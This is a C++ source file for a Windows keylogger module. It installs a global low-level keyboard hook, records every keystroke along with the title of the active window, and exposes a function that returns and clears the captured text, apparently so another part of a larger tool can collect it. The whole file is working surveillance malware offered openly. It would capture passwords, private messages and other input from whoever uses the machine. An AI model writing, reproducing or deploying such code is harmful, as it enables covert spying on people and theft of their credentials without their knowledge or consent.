#include "Keylogger.h"
#include "../utils/Logger.h"
#include <windows.h>
#include <vector>
#include <mutex>
#include <thread>
#include <atomic>
#include <algorithm>
#include <map>
#include <ctime>
#include <sstream>

namespace capture {

    namespace {
        HHOOK g_hHook = NULL;
        std::mutex logMutex;
        std::string keylogBuffer;
        std::thread loggerThread;
        std::atomic<bool> isLogging{false};
        std::string lastTitle;
        DWORD loggerThreadId = 0;

        std::string GetActiveWindowTitle() {
            char title[256];
            HWND hwnd = GetForegroundWindow();
            GetWindowTextA(hwnd, title, sizeof(title));
            return std::string(title);
        }

        LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
            if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
                KBDLLHOOKSTRUCT* pkb = (KBDLLHOOKSTRUCT*)lParam;
                std::lock_guard<std::mutex> lock(logMutex);

                // Window Title
                std::string currentTitle = GetActiveWindowTitle();
                if (currentTitle != lastTitle) {
                    lastTitle = currentTitle;
                    time_t now = time(nullptr);
                    char dt[32];
                    ctime_s(dt, sizeof(dt), &now);
                    dt[strcspn(dt, "\n")] = 0;
                    keylogBuffer += "\n\n[ " + currentTitle + " ]\n";
                }

                // Key translation
                BYTE keyboardState[256];
                GetKeyboardState(keyboardState);

                wchar_t buffer[5];
                int result = ToUnicode(pkb->vkCode, pkb->scanCode, keyboardState, buffer, 4, 0);

                if (result > 0) {
                    buffer[result] = L'\0';
                    int size_needed = WideCharToMultiByte(CP_UTF8, 0, buffer, -1, NULL, 0, NULL, NULL);
                    std::string str(size_needed, 0);
                    WideCharToMultiByte(CP_UTF8, 0, buffer, -1, &str[0], size_needed, NULL, NULL);
                    str.pop_back(); // remove null terminator
                    keylogBuffer += str;
                } else {
                    LOG_DEBUG("ToUnicode failed or non-printable char for VK_CODE: " + std::to_string(pkb->vkCode));
                    std::string nonVisible;
                    switch(pkb->vkCode) {
                        case VK_RETURN: nonVisible = "\n"; break;
                        case VK_BACK:   nonVisible = "[BACKSPACE]"; break;
                        case VK_TAB:    nonVisible = "[TAB]"; break;
                        case VK_SHIFT:  nonVisible = "[SHIFT]"; break;
                        case VK_CONTROL:nonVisible = "[CTRL]"; break;
                        case VK_MENU:   nonVisible = "[ALT]"; break;
                        case VK_CAPITAL:nonVisible = "[CAPS_LOCK]"; break;
                        case VK_DELETE: nonVisible = "[DEL]"; break;
                        default: break; // Ignore others for now
                    }
                    keylogBuffer += nonVisible;
                }

                if (keylogBuffer.size() > 32 * 1024) { // Limit buffer size
                    keylogBuffer = keylogBuffer.substr(keylogBuffer.size() - 16 * 1024);
                }
            }
            return CallNextHookEx(g_hHook, nCode, wParam, lParam);
        }

        void LoggerLoop() {
            MSG msg;
            while (isLogging) {
                while (PeekMessageA(&msg, NULL, 0, 0, PM_REMOVE)) {
                    TranslateMessage(&msg);
                    DispatchMessageA(&msg);
                }
                std::this_thread::sleep_for(std::chrono::milliseconds(10));
            }
        }
    }

    void StartKeylogger() {
        if (isLogging) return;
        isLogging = true;

        g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
        if (!g_hHook) {
            LOG_ERR("SetWindowsHookEx failed: " + std::to_string(GetLastError()));
            isLogging = false;
            return;
        }

        LOG_INFO("Keylogger hook installed (hHook = " + std::to_string((uintptr_t)g_hHook) + ")");

        loggerThread = std::thread([]() {
            loggerThreadId = GetCurrentThreadId();
            LoggerLoop();
        });
    }

    void StopKeylogger() {
        if (!isLogging) return;
        isLogging = false;

        if (g_hHook) {
            UnhookWindowsHookEx(g_hHook);
            g_hHook = NULL;
            LOG_INFO("Keylogger hook removed");
        }

        if (loggerThreadId) {
            PostThreadMessage(loggerThreadId, WM_QUIT, 0, 0);
        }

        if (loggerThread.joinable()) {
            loggerThread.join();
        }
    }

    std::string GetAndClearKeylog() {
        std::lock_guard<std::mutex> lock(logMutex);
        if (keylogBuffer.empty()) return "";
        std::string logs = keylogBuffer;
        keylogBuffer.clear();
        return logs;
    }

}
